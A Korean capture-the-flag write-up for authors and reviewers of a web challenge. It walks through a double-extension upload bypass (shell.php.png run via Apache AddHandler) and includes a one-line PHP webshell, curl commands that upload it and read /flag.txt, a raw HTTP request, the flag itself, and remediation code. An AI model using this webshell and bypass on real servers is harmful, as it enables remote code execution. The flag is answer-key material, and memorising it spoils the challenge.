# 🎄 X-mas Album — 라이트업 (출제자/검수자용)

- **카테고리**: Web / File Upload
- **난이도**: Easy
- **한 줄 요약**: 느슨한 확장자 화이트리스트(마지막 확장자만 검사) + Apache `AddHandler` 설정을 악용한 더블 익스텐션 업로드로 PHP 웹쉘을 실행하고, 웹 루트 바깥의 `/flag.txt` 를 RCE 로 읽는다.

---

## 1. 취약점 원리

### (1) 느슨한 화이트리스트 — `upload.php`

업로드 검증은 화이트리스트 방식이지만, **파일명의 마지막 확장자 하나만** 떼어서 검사한다.

```php
$ALLOWED = ['jpg', 'jpeg', 'png'];
$ext = strtolower(pathinfo($originalName, PATHINFO_EXTENSION)); // 마지막 확장자만
if (!in_array($ext, $ALLOWED, true)) { /* 거부 */ }
```

`pathinfo(..., PATHINFO_EXTENSION)` 는 가장 마지막 `.` 뒤 문자열만 반환한다.

| 파일명 | 추출된 확장자 | 검사 결과 |
|--------|---------------|-----------|
| `cat.png` | `png` | 통과 |
| `shell.php` | `php` | 거부 |
| **`shell.php.png`** | **`png`** | **통과 ✅** |

즉 중간에 낀 `.php` 는 전혀 확인하지 않는다. 또한 Content-Type 도 검사하지 않아
요청을 조작할 필요조차 없다. 저장 시 **원본 파일명을 그대로 유지**하므로
`shell.php.png` 라는 이름이 서버에 그대로 남는다.

### (2) Apache `AddHandler` — `apache/xmas-album.conf`

핵심은 아파치가 이 파일을 **PHP 로 실행**해 주는지 여부다.

```apache
AddHandler application/x-httpd-php .php
```

`mod_mime` 은 파일명을 `.` 기준으로 나눈 **모든 조각**을 확장자로 취급한다.
`AddHandler` 로 `.php` 를 핸들러에 등록하면, 파일명 **어느 위치에든** `.php`
토큰이 있으면 PHP 핸들러가 적용된다.

```
shell.php.png  ->  조각: [ shell, php, png ]
                   -> .php 토큰 존재 -> application/x-httpd-php 핸들러 -> PHP 실행!
```

> 참고: 공식 `php:apache` 이미지는 기본적으로
> `<FilesMatch \.php$> SetHandler application/x-httpd-php </FilesMatch>` 를 써서
> **파일명이 `.php` 로 끝날 때만** 실행한다. 이 설정만 있으면 `shell.php.png`
> (끝이 `.png`)는 실행되지 않는다. 본 챌린지는 `AddHandler` 를 추가로 적용해
> 더블 익스텐션이 실제로 실행되도록 만들었다.

### (3) 업로드 위치

`uploads/` 는 웹 루트(`/var/www/html`) 하위에 있고, 아파치 설정에서 PHP 실행을
막지 않는다. 따라서 업로드한 `shell.php.png` 에 직접 접근하면 코드가 실행된다.

### (4) 플래그 위치

플래그는 `/flag.txt` (웹 루트 바깥)에 있어 직접 다운로드가 불가능하다.
웹쉘로 명령을 실행해 파일을 읽어야만 획득할 수 있다.

---

## 2. 단계별 익스플로잇

### Step 0. 정찰
- 메인 페이지에서 "jpg, png 만 가능" 안내 확인 → 확장자 필터 존재 암시.
- 갤러리(`gallery.php`)에서 업로드된 파일이 `uploads/<파일명>` 경로로 **직접 접근
  가능**함을 확인 → 업로드 위치 파악.

### Step 1. 웹쉘 준비

`shell.php.png` 라는 이름의 파일을 만들고, 내용은 PHP 웹쉘로 채운다.

```php
<?php system($_GET['cmd']); ?>
```

> 선택: 앞에 가짜 PNG 시그니처(`\x89PNG...`)를 붙여도 되지만, 본 챌린지는
> Content-Type/시그니처 검사를 하지 않으므로 순수 PHP 만으로 충분하다.

### Step 2. 업로드

폼으로 `shell.php.png` 를 선택해 업로드한다. 마지막 확장자가 `png` 이므로 통과한다.

```bash
curl -s -F 'photo=@shell.php.png' http://localhost:8000/upload.php
```

응답에 저장 경로 `uploads/shell.php.png` 가 노출된다. (갤러리에서도 확인 가능)

### Step 3. RCE

업로드된 경로에 직접 접근하면 PHP 가 실행된다.

```bash
# 명령 실행 확인
curl -s 'http://localhost:8000/uploads/shell.php.png?cmd=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Step 4. 플래그 획득

```bash
curl -s 'http://localhost:8000/uploads/shell.php.png?cmd=cat%20/flag.txt'
# XMAS{d0ubl3_3xt3ns10n_1s_n4ughty_ada8df52}
```

플래그 위치를 모른다면 먼저 탐색:

```bash
curl -s 'http://localhost:8000/uploads/shell.php.png?cmd=ls%20/'
curl -s 'http://localhost:8000/uploads/shell.php.png?cmd=cat%20/flag.txt'
```

---

## 3. 예시: 실제 업로드 요청(raw HTTP)

```http
POST /upload.php HTTP/1.1
Host: localhost:8000
Content-Type: multipart/form-data; boundary=----xmas

------xmas
Content-Disposition: form-data; name="photo"; filename="shell.php.png"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
------xmas--
```

실행:

```http
GET /uploads/shell.php.png?cmd=cat+/flag.txt HTTP/1.1
Host: localhost:8000
```

---

## 4. 핵심 교훈 (교육 포인트)

- 확장자 검증은 **마지막 확장자만** 보면 안 된다(더블 익스텐션).
- 화이트리스트를 쓰더라도 **서버 실행 설정**(`AddHandler`, `.htaccess`, MIME 핸들러)과
  함께 봐야 안전하다.
- 업로드 디렉토리에서는 **스크립트 실행을 비활성화**해야 한다
  (`php_admin_flag engine off`, 실행 핸들러 제거, 별도 스토리지/CDN 등).
- 업로드 파일은 **원본 파일명을 신뢰하지 말고** 랜덤 이름 + 안전한 확장자로 재저장한다.
- 콘텐츠 검증(매직바이트, 재인코딩)도 병행한다.

### 올바른 수정 예시(참고)

```php
// 랜덤 이름 + 화이트리스트 확장자만 부여
$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
if (!in_array($ext, ['jpg','jpeg','png'], true)) { reject(); }
$safe = bin2hex(random_bytes(8)) . '.' . $ext;   // shell.php.png -> 랜덤.png
```

```apache
# 업로드 디렉토리 PHP 실행 차단
<Directory /var/www/html/uploads>
    php_admin_flag engine off
    RemoveHandler .php
    SetHandler none
</Directory>
```
